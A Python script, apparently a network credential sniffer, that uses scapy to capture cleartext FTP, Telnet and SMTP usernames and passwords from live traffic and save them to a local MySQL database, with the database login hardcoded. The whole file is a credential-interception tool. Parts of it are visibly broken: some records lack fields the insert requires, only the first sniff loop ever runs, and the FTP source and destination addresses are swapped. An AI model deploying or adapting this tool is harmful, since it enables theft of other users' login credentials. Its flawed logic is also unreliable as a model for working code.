#!/usr/bin/python3
from scapy.all import *
import mysql.connector
import datetime



# Connection to MySQL database
db = mysql.connector.connect(
    host="localhost",
    user="enzo",
    password="root",
    database="wirepass_db"
)
cursor = db.cursor()

def ftp_packet_callback(pkt):
    if pkt.haslayer(TCP) and pkt.haslayer(IP):
        src_ip = pkt[IP].src
        dst_ip = pkt[IP].dst
        if pkt.haslayer(Raw):
            payload = pkt[Raw].load.decode("utf-8", errors="ignore")
            if "USER" in payload:
                lines = payload.split("\r\n")
                for line in lines:
                    if line.startswith("USER"):
                        global ftp_username
                        ftp_username = line.split(" ")[1]
                        print("Nouvelle connexion FTP détectée : {} -> {}".format(src_ip, dst_ip))
                        print("Username : {}".format(ftp_username))
            if "PASS" in payload:
                lines = payload.split("\r\n")
                for line in lines:
                    if line.startswith("PASS"):
                        global ftp_password
                        ftp_password = line.split(" ")[1]
                        print("Mot de passe : {}".format(ftp_password))
            if "QUIT" in payload:
                print("Connexion terminée : {} -> {}".format(src_ip, dst_ip))
                # Delete the user from the database
                #delete_user('ftp', src_ip, dst_ip)
            if "Login successful" in payload:
                print("Login successful for",ftp_username)
                current_time = datetime.datetime.now()
                formatted_heur = str(current_time.strftime('%H:%M:%S'))
                current_date = datetime.date.today()
                user = {
                    'type': 'ftp',
                    'source_ip': dst_ip,
                    'destination_ip': src_ip,
                    'username': ftp_username,
                    'password': ftp_password,
                    'day': current_date,
                    'heur': formatted_heur
                }
                insert_user(user)

def telnet_packet_callback(pkt):
    if pkt.haslayer(TCP) and pkt.haslayer(IP):
        src_ip = pkt[IP].src
        dst_ip = pkt[IP].dst
        if pkt.haslayer(Raw):
            payload = pkt[Raw].load.decode("utf-8", errors="ignore")
            if "Username:" in payload:
                lines = payload.split("\r\n")
                for line in lines:
                    if line.startswith("Username:"):
                        telnet_username = line.split(" ")[1]
                        print("Nouvelle connexion TELNET détectée : {} -> {}".format(src_ip, dst_ip))
                        print("Utilisateur : {}".format(telnet_username))
                        user = {
                            'type': 'telnet',
                            'source_ip': src_ip,
                            'destination_ip': dst_ip,
                            'username': telnet_username,
                            'password': None
                        }
                        insert_user(user)
            if "Password:" in payload:
                lines = payload.split("\r\n")
                for line in lines:
                    if line.startswith("Password:"):
                        telnet_password = line.split(" ")[1]
                        print("Mot de passe : {}".format(telnet_password))

def smtp_packet_callback(pkt):
    if pkt.haslayer(TCP) and pkt.haslayer(IP):
        src_ip = pkt[IP].src
        dst_ip = pkt[IP].dst
        if pkt.haslayer(Raw):
            payload = pkt[Raw].load.decode("utf-8", errors="ignore")
            if "User:" in payload:
                lines = payload.split("\r\n")
                for line in lines:
                    if line.startswith("User:"):
                        smtp_username = line.split(":")[1].strip()
                        print("Nouvelle connexion SMTP détectée : {} -> {}".format(src_ip, dst_ip))
                        print("Utilisateur : {}".format(smtp_username))
                        user = {
                            'type': 'smtp',
                            'source_ip': src_ip,
                            'destination_ip': dst_ip,
                            'username': smtp_username,
                            'password': None
                        }
                        insert_user(user)
            if "Pass:" in payload:
                lines = payload.split("\r\n")
                for line in lines:
                    if line.startswith("Pass:"):
                        smtp_password = line.split(":")[1].strip()
                        print("Mot de passe : {}".format(smtp_password))

def insert_user(user):
    sql = "INSERT INTO users (type, source_ip, destination_ip, username, password, day, heur) VALUES (%s, %s, %s, %s, %s, %s, %s)"
    values = (user['type'], user['source_ip'], user['destination_ip'], user['username'], user['password'], user['day'], user['heur'])
    cursor.execute(sql, values)
    db.commit()

def start_packet_sniffing():
    sniff(filter="tcp", prn=ftp_packet_callback, store=0)
    sniff(filter="tcp", prn=telnet_packet_callback, store=0)
    sniff(filter="tcp", prn=smtp_packet_callback, store=0)

if __name__ == '__main__':
    start_packet_sniffing()
    
